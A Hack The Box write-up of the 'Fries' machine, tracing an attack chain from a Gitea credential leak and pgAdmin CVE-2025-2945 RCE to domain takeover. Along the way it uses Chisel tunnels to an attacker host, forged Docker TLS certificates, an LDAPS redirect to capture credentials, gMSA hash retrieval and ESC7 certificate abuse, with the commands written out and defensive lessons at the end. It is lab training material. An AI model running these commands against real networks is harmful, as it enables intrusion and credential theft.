---
title: "Fries"
description: "A Gitea credential leak and pgAdmin container RCE lead through NFS certificate extraction and Docker control to ESC7 domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - docker
  - gmsa
---

## Summary

Fries is a Medium Windows Active Directory machine featuring a dual-OS architecture: a Linux host running SSH and nginx alongside a Windows domain controller. Initial Gitea repository credentials leak a database connection string, enabling exploitation of CVE-2025-2945 in pgAdmin 4 for container RCE. Environment variable harvesting yields SSH credentials on the host. NFS share mounting via Chisel tunnel exposes Docker TLS certificates, enabling full Docker daemon control. Inside a PWM container, LDAP configuration modification redirects traffic to capture domain credentials. The captured `<INFRASTRUCTURE_SERVICE_ACCOUNT>` account has gMSA read privileges, and ESC7 on the Certificate Authority enables certificate template abuse with SAN specification, resulting in full domain compromise.

## Context and Objective

The engagement targeted a dual-OS Active Directory environment with Linux and Windows services coexisting behind a shared IP. The domain controller ran Kerberos, LDAP, and DNS services while the Linux host provided SSH, nginx, and container orchestration. Enumeration identified five Docker containers (Gitea, PostgreSQL, pgAdmin, PWM, web application) forming a microservices architecture. The objective was to compromise the domain through credential reuse, container escape, and Active Directory Certificate Services abuse.

## Approach and Evidence

### Enumeration and Initial Access

Port scanning revealed the dual-OS architecture with both Linux (SSH, nginx) and Windows (Kerberos, LDAP, MSRPC) services.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Fries-TCP
```

Virtual host discovery identified `<SOURCE_CONTROL_HOST>` hosting a Gitea instance.

```bash
gobuster vhost --url http://<TARGET_HOST> --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

The notes report provided Gitea credentials (`<SOURCE_CONTROL_USER>@<TARGET_DOMAIN>` / `<GITEA_PASSWORD>`) leading to repository review, where git history leaked a `.env` file containing database credentials. A repository comment referenced `<DATABASE_MANAGEMENT_HOST>` as the database management interface.

### pgAdmin 4 CVE-2025-2945 RCE

The internal panel at `http://<DATABASE_MANAGEMENT_HOST>` ran pgAdmin 4 version 9.1, vulnerable to CVE-2025-2945. Exploitation provided a shell inside the pgAdmin container.

```bash
python3 poc.py --target-url http://<DATABASE_MANAGEMENT_HOST> --username <SOURCE_CONTROL_USER>@<TARGET_DOMAIN> --password '<GITEA_PASSWORD>' --db-user <DB_USER> --db-pass '<DB_PASSWORD>' --db-name <DATABASE_NAME> --payload "<SANITIZED_PAYLOAD>"
```

Container environment variables revealed additional credentials reused on the host.

### SSH Access via Password Reuse

The discovered password worked against SSH for the `<SERVICE_ACCOUNT>` user.

```bash
sshpass -p '<SSH_PASSWORD>' ssh -o PreferredAuthentications=password <SVC_USER>@<TARGET_IP>
```

### NFS Share Mount via Chisel Tunnel

NFS shares were accessible from Docker internal networks. Chisel tunneled NFS back to the attack machine.

```bash
./chisel client <ATTACKER_IP>:<CHISEL_PORT> R:2049:<DOCKER_GATEWAY_IP>:2049
sudo mount -t nfs localhost:/ /mnt/fries_nfs -o nolock
```

The NFS export used a numeric GID for access control. A matching local group was created to read files, revealing Docker TLS certificates under `/srv/<WEB_HOST>/certs`.

### Docker Daemon Abuse

The Docker daemon ran with TLS verification on `<DOCKER_API_IP>:2376`. Chisel tunneled the Docker API port.

```bash
./chisel client <ATTACKER_IP>:<CHISEL_PORT> R:2376:<DOCKER_API_IP>:2376
```

A client certificate was signed using the extracted CA key to authenticate against the Docker daemon.

```bash
openssl genrsa -out sysadm-key.pem 4096
openssl req -new -key sysadm-key.pem -out sysadm.csr -subj '/CN=root'
openssl x509 -req -in sysadm.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out sysadm-cert.pem -days 365 -sha256
```

Container listing revealed five running containers. The PWM container was targeted for credential harvesting.

### PWM LDAP Credential Capture

Inside the PWM container, the configuration at `/config/PwmConfiguration.xml` contained an LDAP URL pointing to `ldaps://<DOMAIN_CONTROLLER_HOST>:636`. The configuration was modified to redirect LDAPS traffic to the attack machine.

```bash
sed -i 's|ldaps://<DOMAIN_CONTROLLER_HOST>:636|ldaps://<ATTACKER_IP>:636|g' PwmConfiguration.xml
```

Responder captured the cleartext LDAP bind credentials when the PWM service restarted and attempted authentication.

### gMSA Credential Retrieval

The captured `<INFRASTRUCTURE_SERVICE_ACCOUNT>` account had `PrincipalsAllowedToReadPassword` privilege on a group Managed Service Account used for Certificate Authority operations.

```bash
nxc ldap <DOMAIN> -u <INFRASTRUCTURE_SERVICE_ACCOUNT> -p '<INFRASTRUCTURE_SERVICE_PASSWORD>' --gmsa
```

The gMSA NTLM hash was retrieved, providing credentials for CA operations.

### ESC7 Certificate Abuse

Certipy identified ESC7 on the CA — insecure delegated security roles allowing privilege escalation. The CA's `EditFlags` were modified via PowerShell using the PSPKI module to enable SAN specification, exposing ESC6 behavior.

```powershell
Import-Module PSPKI
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "<CA_FQDN>"
$configReader.SetRootNode($true)
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
Restart-Service certsvc
```

A certificate was requested for the Administrator user using the `User` template with `-upn` and `-sid` parameters.

```bash
certipy req -u '<INFRASTRUCTURE_SERVICE_ACCOUNT>@<DOMAIN>' -p '<INFRASTRUCTURE_SERVICE_PASSWORD>' -dc-ip <TARGET_IP> -ca '<CA_NAME>' -template 'User' -upn 'administrator@<DOMAIN>' -sid '<ADMIN_SID>' -dynamic-endpoint
```

Certificate authentication retrieved the Administrator NTLM hash.

```bash
certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
```

## Challenges and Decisions

- **Dual-OS Architecture:** The combination of Linux host services with Windows AD domain controller required enumerating both platforms simultaneously, with NFS and Docker bridging the gap between them.
- **NFS GID Access Control:** The numeric GID restriction on NFS exports required creating a matching local group to access the Docker TLS certificates.
- **PWM Configuration Modification:** Redirecting LDAPS traffic through the PWM container required disabling the configuration editor to prevent automatic revert, then restarting the container for changes to take effect.
- **ESC7 to ESC6 Transition:** Exploiting ESC7 required modifying `EditFlags` to enable SAN specification, effectively downgrading the CA security to expose certificate template abuse.

## Outcome

The engagement achieved full domain compromise through a multi-stage attack chain: Gitea credential leak → pgAdmin container RCE → SSH access → NFS certificate extraction → Docker daemon control → PWM LDAP credential capture → gMSA hash retrieval → ESC7/ESC6 certificate abuse → Administrator NTLM hash. The chain demonstrated how containerized microservices with shared credentials and misconfigured certificate authorities can lead to complete domain takeover.

## Lessons and Recommendations

- **Git History Security:** Exposed `.env` files in repository history leak database credentials. Audit repository history before deployment and use tools like `git-secrets` or `trufflehog` to prevent credential commits.
- **pgAdmin Patching:** CVE-2025-2945 in pgAdmin 4 demonstrates the risk of unpatched web management interfaces. Apply security updates promptly and restrict internal management interfaces.
- **NFS Export Hardening:** Improperly restricted NFS exports allowed access to Docker TLS certificates. Use specific user/group restrictions and network-level access controls.
- **Docker TLS Certificate Management:** Docker TLS certificates stored on NFS shares create a single point of failure. Store certificates in secure, access-controlled locations and rotate them regularly.
- **PWM Configuration Security:** Modifying PWM's LDAP configuration to redirect traffic enabled credential capture. Implement configuration integrity monitoring and restrict container filesystem access.
- **gMSA Permission Auditing:** Review `PrincipalsAllowedToReadPassword` permissions on gMSA accounts regularly. Restrict read access to only necessary service accounts.
- **AD CS Security:** ESC7 on the CA highlights the importance of auditing delegated security roles. Follow least-privilege principles for CA management and monitor `EditFlags` changes.

## References

- HTB [Fries](https://app.hackthebox.com/machines/Fries) machine: Hack The Box retired machine
- CVE-2025-2945: pgAdmin 4 remote code execution vulnerability
- PSPKI Module: PowerShell PKI module for Certificate Authority management
- Certipy: AD CS abuse tool for certificate template enumeration and abuse
